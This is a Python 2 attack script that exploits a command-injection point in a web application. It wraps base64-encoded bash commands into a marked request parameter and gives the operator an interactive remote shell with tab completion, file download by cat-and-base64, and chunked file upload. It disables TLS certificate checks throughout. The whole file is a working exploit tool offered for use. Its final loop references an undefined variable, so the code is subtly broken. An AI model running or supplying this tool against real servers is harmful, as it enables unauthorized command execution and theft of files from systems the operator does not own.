#!/usr/bin/env python

import os
import re
import ssl
import sys
import base64
import string
import random
import urllib
import urllib2
import urlparse
import readline
from optparse import OptionParser


POST_CHUNK_SIZE = 1024 * 40
GET_CHUNK_SIZE = 512
UPLOAD_CHUNK_SIZE = POST_CHUNK_SIZE
SHELL_PROMPT = "\033[1m\033[94m%s\033[0m\033[22m$ "
CURRENT_DIR_CMD = "pwd"
DOWNLOAD_CMD = "get"
UPLOAD_CMD = "put"
EXIT_CMD = "exit"
INJECT_MARK = "INJECT_HERE"


parser = OptionParser()
parser.add_option("-u", "--url", dest="url",
                  help="target URL")
parser.add_option("-p", "--params", dest="params",
                  help="URL encoded parameters including '{}' mark".format(INJECT_MARK))
parser.add_option("-H", "--header", action='append', dest="headers",
                  help="HTTP Header", default=[])
parser.add_option("-m", "--method", dest="method",
                  help="HTTP request method, Default POST", default="POST")
parser.add_option("-t", "--timeout", dest="timeout",
                  help="HTTP request timeout in seconds, Default 10s", default=10)
parser.set_usage("Usage: %prog -u url -p params [-H <header>] [-m [GET|POST]] [-t 10]")

(options, args) = parser.parse_args()
if options.url is None or options.params is None or INJECT_MARK not in options.params:
    parser.print_help()
    sys.exit()

url = options.url
method = options.method
params = {}
headers = {}
http_timeout = None
shell_current_dir = "."
shell_complete_list = {}


def execute_command(cmd, current_dir=None):
    boundary = ''.join([random.choice(string.ascii_letters) for _ in xrange(32)])
    if current_dir is None:
        current_dir = shell_current_dir

    # Generate payload
    command = base64.b64encode('bash -c "echo {};cd {} 2>&1;{} 2>&1;echo {};"'.format(
        boundary, current_dir, cmd, boundary))
    payload = "bash -c \"$(base64 -d <<<{})\"".format(command)

    # Replace injection point with custom payload
    payload_params = {}
    for key in params:
        if INJECT_MARK in params[key]:
            payload_params[key] = params[key].replace(INJECT_MARK, payload)
        else:
            payload_params[key] = params[key]

    # Send HTTP request
    query_str = urllib.urlencode(payload_params)
    if method == 'GET':
        req = urllib2.Request(url + "?" + query_str, headers=headers)
    else:
        req = urllib2.Request(url, data=query_str, headers=headers)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        res = urllib2.urlopen(req, context=ctx, timeout=http_timeout)
    except urllib2.URLError as e:
        print("[!] Failed to open remote target URL:")
        print(str(e))
        sys.exit()
    result = ""
    try:
        result = res.read().split(boundary)
    except Exception as e:
        print("[!] Failed to read remote target response:")
        print(str(e))

    if len(result) != 3:
        return None
    else:
        return result[1].lstrip()


def download_file(remote_filename):
    content = execute_command("cat {} 2>&1 | base64".format(remote_filename))
    local_filename = os.path.basename(remote_filename)
    open(local_filename, "wb").write(base64.b64decode(content))


def upload_file(filename):
    try:
        f = open(filename, "rb")
        remote_filename = os.path.basename(filename)
        # Create remote file and check if there permission issue
        output = execute_command("bash -c ':>{}'".format(remote_filename))
        if output.strip() != "":
            raise Exception(output.strip())
        file_size = os.fstat(f.fileno()).st_size
        chunk_count = int(file_size / UPLOAD_CHUNK_SIZE)
        if file_size % UPLOAD_CHUNK_SIZE != 0:
            chunk_count += 1
        index = 1
        while True:
            chunk = f.read(UPLOAD_CHUNK_SIZE)
            if not chunk:
                break
            sys.stdout.write("\r[*] Upload file %s chunk [%d/%d]" % (remote_filename, index, chunk_count))
            sys.stdout.flush()
            chunk = base64.b64encode(chunk)
            execute_command("printf %s | base64 -d >>%s" % (chunk, remote_filename))
            index += 1
        f.close()
        print("\n")
    except Exception as e:
        print("[!] Failed to upload file: %s\n" % (str(e)))


def get_current_dir(current_dir, command, output):
    parts = re.split("\\s+", command)
    output = output.strip()
    # Keep current dir if 1) command is not cd or 2) return an error
    if parts[0] != "cd" or (output != "" and not output.startswith("/")):
        return current_dir

    if parts[1].startswith("/"):
        return os.path.abspath(parts[1])
    elif parts[1] == "-" and output.startswith("/"):
        return os.path.abspath(output.strip())
    else:
        return os.path.abspath(os.path.join(current_dir, parts[1]))


def populate_complete_list(path):
    """
    TODO replace to use os.listdir
    """
    output = execute_command("ls -ap", current_dir=path)
    entries = output.split("\n")[:-1]
    shell_complete_list[path] = []
    for file in entries:
        if file not in ["./", "../"]:
            shell_complete_list[path].append(file)


def completer(text, state):
    token = readline.get_line_buffer().split()[-1]
    path = os.path.join(shell_current_dir, os.path.dirname(token))
    if not path.endswith("/"):
        path += "/"
    if path not in shell_complete_list:
        populate_complete_list(path)
    if 'libedit' in readline.__doc__:
        suffix = re.sub(".*[%s]" % (re.escape(readline.get_completer_delims())), "", text)
        prefix = re.sub("{}$".format(suffix), "", text)
        result = [prefix + x for x in shell_complete_list[path] if x.startswith(suffix)][state]
    else:
        result = [x for x in shell_complete_list[path] if x.startswith(text)][state]
    return result


def initialize_auto_complete():
    if 'libedit' in readline.__doc__:
        readline.parse_and_bind("bind ^I rl_complete")
    else:
        readline.parse_and_bind("tab: complete")
    readline.set_completer_delims(" /;&'\"")
    readline.set_completer(completer)


for entry in urlparse.parse_qsl(options.params):
    params[entry[0]] = entry[1]
for header in options.headers:
    name, value = header.split(":", 1)
    headers[name] = value.strip()
if options.method != 'POST':
    UPLOAD_CHUNK_SIZE = GET_CHUNK_SIZE
http_timeout = int(options.timeout)

current_dir_output = execute_command(CURRENT_DIR_CMD)
if current_dir_output is None:
    print("[!] Failed to execute '{}' command to obtain current directory on remote server".format(CURRENT_DIR_CMD))
    sys.exit()
shell_current_dir = current_dir_output.strip()
initialize_auto_complete()


while True:
    input_cmd = raw_input(SHELL_PROMPT % (shell_current_dir, )).strip()

    if input_cmd == "":
        continue
    elif input_cmd == EXIT_CMD:
        break

    download_upload_re = "({}|{})\\s+".format(DOWNLOAD_CMD, UPLOAD_CMD)
    if re.match(download_upload_re, input_cmd):
        _filename = re.sub(download_upload_re, "", input_cmd)

        if input_cmd.startswith(DOWNLOAD_CMD):
            download_file(_filename)
        else:
            upload_file(_filename)
        continue

    cmd_output = execute_command(input_cmd)
    print(cmd_output)
    _current_dir = get_current_dir(shell_current_dir, input_cmd, output)
    if _current_dir != shell_current_dir:
        shell_current_dir = _current_dir
